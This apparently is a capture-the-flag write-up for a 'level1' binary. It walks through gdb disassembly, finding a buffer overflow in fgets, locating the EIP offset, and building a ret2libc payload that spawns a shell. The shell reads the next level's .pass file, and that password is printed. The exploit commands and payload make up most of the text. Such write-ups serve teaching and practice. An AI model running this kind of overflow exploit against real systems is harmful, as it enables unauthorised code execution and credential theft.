gdb> disass main
0x080484db <+11>:	lea    ebx,[esp+0x1c]
0x080484df <+15>:	mov    eax,0x0
0x080484e4 <+20>:	mov    edx,0x10
0x080484e9 <+25>:	mov    edi,ebx
0x080484eb <+27>:	mov    ecx,edx
0x080484ed <+29>:	rep stos DWORD PTR es:[edi],eax
[...]
0x0804855c <+140>:	mov    eax,ds:0x804a020
0x08048561 <+145>:	mov    DWORD PTR [esp+0x8],eax
0x08048565 <+149>:	mov    DWORD PTR [esp+0x4],0x64
0x0804856d <+157>:	lea    eax,[esp+0x1c]
0x08048571 <+161>:	mov    DWORD PTR [esp],eax
0x08048574 <+164>:	call   0x8048370 <fgets@plt>
# Here we can see a buffer of length 16 where we try to store 100 chars
# We can try exploit this

gdb> pattern create 128
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA'
gdb> r
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA'

SIGSEGV

gdb> pattern search
[...]
Registers contain pattern buffer:
EIP+0 found at offset: 80
[...]
# Here we manage to overwrite the EIP at offset 80
# We cas then use a ret2libc exploit

# First we find the adress of `system` function call
gdb> info func system
[...]
0xf7e6aed0  system
[...]

# Then we search for the string "/bin/sh"
gdb> searchmem "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f897ec ("/bin/sh")

# And we need a return address
gdb> disass main
[...]
0x080485b5 <+229>:	ret
[...]

# We need to write 255 char for the first `fgets`
# Then we prepare the payload
$> python -c "print 'dat_wil' + 'B' * 248 + 'A' * 80 + '\xb5\x85\x04\x08' + '\xd0\xae\xe6\xf7' + 'DUMM' + '\xec\x97\xf8\xf7'" > /tmp/pl1
$> cat /tmp/pl1 - | ./level1
$ cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
